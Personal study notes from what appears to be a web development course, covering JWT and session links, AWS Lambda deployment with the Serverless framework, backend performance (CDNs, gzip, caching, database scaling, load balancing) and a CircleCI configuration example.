Sessions + JWT

https://dzone.com/articles/cookies-vs-tokens-the-definitive-guide

https://cdn.auth0.com/blog/cookies-vs-tokens/cookie-token-auth.png

https://stackoverflow.com/questions/17000835/token-authentication-vs-cookies

https://scotch.io/bar-talk/why-jwts-suck-as-session-tokens

https://medium.com/better-programming/when-to-use-callback-function-of-setstate-in-react-37fff67e5a6c

https://stackoverflow.com/questions/42038590/when-to-use-react-setstate-callback

https://reactjs.org/docs/portals.html

https://www.w3schools.com/charsets/ref_html_entities_4.asp

https://auth0.com/blog/refresh-tokens-what-are-they-and-when-to-use-them/

https://security.stackexchange.com/questions/108662/why-is-bearer-required-before-the-token-in-authorization-header-in-a-http-re

improvements

Task 1: Add pet  and age  column to the database and allow users to update these fields on their profile.

Task 2: Implement token flow as we have done so far for /register  end point as well.

Task 3: Add Sign out functionality where you revoke the token when a user signs out of the app

Task 4 (Bonus): You may notice a lot of repeated code (especially when it comes to fetch()). How can you improve this? Try to refactor the code and perhaps also improve the logic to make the app even better!

-

pesquisar sessionstorage e dif entre localstorage

update node version on dockerfile
upgrade docker compose file
implement morgan 
change bcrypt-nodejs to bcrypt or bcrypt.js
update packages
refactor code with async await for example

-

https://github.com/aneagoie/smart-brain-boost/commits/master

https://github.com/aneagoie/smart-brain-boost-api

https://github.com/aneagoie/smart-brain-boost-api-dockerized











AWS

amazon web services


front 
ec2
s3
dynamodb
lambda


aws diagrams

aws flows

Monolithic vs Micro-services


lambda functions

- create function
- name: rankly
- nodejs last version
- choose a custom role
- create


use a tool called serverless to deploy the function
instead of using the aws dashboard

Just a heads up that since the next video was created, AWS Lambda uses the async version of the hello function rather than the callback. It instead looks something like this:

'use strict'; 
module.exports.hello = async (event, context) => {  
    return {    
        statusCode: 200,    
        body: JSON.stringify({      
            message: 'Go Serverless v1.0! Your function executed successfully!',      
            input: event,    
        }),  
    };    
// Use this code if you don't use the http event with the LAMBDA-PROXY integration  
// return { message: 'Go Serverless v1.0! Your function executed successfully!', event };
};

Underneath it all, it is still doing the same thing as you will see in this video coming up



sudo npm install -g serverless

sls create -t aws-nodejs

mkdir rankly

-copy the files to the new folder

> handler.js is the function


aws iam

add a user rankly-lambda with programmatic access
atach existing policies - administration access

- user the user from iam to cconfigure the serverless
sls config credentials --provider aws --key MYKEY --secret MYSECRET

https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_manage.html

https://www.serverless.com/framework/docs/providers/aws/guide/iam/

- uptade the name of the service in serverless.yaml file

- create a http event in yaml file above the function handler definition

- update the stage to prod on yaml file

```
events:
	- http:
		path: rank
		method: get
```

```
'use strict';

const emojis = [
  '😄','😃','😀','😊','😉','😍','🔶','🔷', '🚀'
];
module.exports.hello = (event, context, callback) => {
  const rank = event.queryStringParameters.rank;
  const rankEmoji = emojis[rank >= emojis.length ? emojis.length - 1 : rank];
  const response = {
    statusCode: 200,
    headers: {
      "Access-Control-Allow-Origin" : "*" // Required for CORS support to work
    },
    body: JSON.stringify({
      message: 'Rank generated!',
      input: rankEmoji,
    }),
  };

  callback(null, response);

  // Use this code if you don't use the http event with the LAMBDA-PROXY integration
  // callback(null, { message: 'Go Serverless v1.0! Your function executed successfully!', event });
};
```

tto deploy just run
- sls deploy

you can access the function by the url provided after the deploy


to run
- sls invoke --function rank

to run locally
- sls invoke local --function rank



update fron end side

- component rank
- 

https://github.com/aneagoie/smart-brain-boost-lambda




As a bonus and if you really want to challenge yourself, try and implement this feature:

Ability for users to upload new pictures to their profile. 

As an idea, you can use an upload profile button to trigger a lambda function that uploads the image to an S3 bucket where you store user profile pictures. Good luck!



















Performance part 3



Backend

- CDNs
	- content delivery network
		-pros and cons
		-cache
	- cloudflare
	- hoe to configure
	- dns name servers
- GZIP
	- npm install compression (as a middleeware in a express api)
	- github pages does it automatically
	- how to configure in different seervers
	- https://github.com/google/brotli is a little bit better than gzip
- DB Scaling
	- Six items that are the main ways that a database can scale
		- Identify Inefficient Queries
			- use indexing (pros and cons)
		- Increase Memory
		- Vertical Scaling (Redis, Memcached)
		- Sharding
		- More Databases
		- Database type
- Caching
	- cahe in browser
	- how to control the cache in browsers
	- caching brusting (in react)
	- http cache
		- Cache-Control and ETag header in http requests
		- https://blogs.sap.com/wp-content/uploads/2020/03/http-request.png
		-
```javascript
const express = require('express')
const cors = require('cors')
const path = require('path')

const app = express()
app.use(cors())
app.use('/static', express.static(path.join(__dirname, 'public'), {'maxage': '2h'}))

app.get('/hi', (req, res) => {
	res.header('Cache-Control', 'public, max-age=86400')
	res.header('Content-Type', 'text/html')
	res.send(new Buffer('<h2>Test String</h2>'))
})
```
	- https://medium.freecodecamp.org/the-hidden-components-of-web-caching-970854fe2c49
	- https://developers.google.com/web/fundamentals/performance/optimizing-content-efficiency/http-caching
	- https://devcenter.heroku.com/articles/increasing-application-performance-with-http-cache-headers
- Load Balancing
	- apache and nginx
	- aws load balancer
	- nginx can be used as a load balancer and can cache the static files as well
	- https://github.com/aneagoie/load-balancer-exercise
	- load balancing test
	- there are a lot o packages for example loadtest
	- sudo npm install -g loadtest
	- loadtest -t 5 -c 100 --rps 100 http>//localhost:80
	- run 1 time with the docker (load balancer) and otheer with just the single server (npm start) and see the difference increasing the params test like loadtest -t 5 -c 1000 --rps 500 http://localhost:80
	- because we are running this on a container it is slower than if we actually implemented load balancing properly
	- try to make the loadbalancer faster than single server#
	- https://nginx.org/en/docs/
	- https://www.linode.com/docs/web-servers/nginx/how-to-configure-nginx/














CI/CD

- Continuous Integration, Continuous Delivery, Continuous Deployment
- benefits
- small incremental changes
- circle ci
- circle ci and github
- ci with github
- https://code-maze.com/top-8-continuous-integration-tools/
- https://github.com/aneagoie/robofriends-ci
- config.yaml example
```
version: 2
jobs:
   build:
     docker:
       - image: circleci/node:8.9
     steps:
       - checkout
       - run: npm install
       - run: CI=true npm run build
   test:
     docker:
       - image: circleci/node:8.9
     steps:
       - checkout
       - run: npm install
       - run: npm run test
   hithere:
     docker:
       - image: circleci/node:8.9
     steps:
       - checkout
       - run: echo "Hellloooo!"
workflows:
  version: 2
  build-test-and-lint:
    jobs:
      - build
      - hithere
      - test:
          requires:
            - hithere
```
- exec prettier on pre commit hook
- https://prettier.io/docs/en/precommit.html
- webpack-bundle-analyzer package
- search for ci/cd process used by companies
- staging environment
- code review
- acceptance test
- smoke test
- new relic
- graphana












Extra Bits

- Complexity vs Simplicity
Always choose simplicity over complexity
Complexity and Simplicity is on a spectrum not binary, It's not either simplistic or complex. That means it's not right or wrong

- NPM is not your friend
npm install is not your answer

- Learn to Learn

- Start with Why









































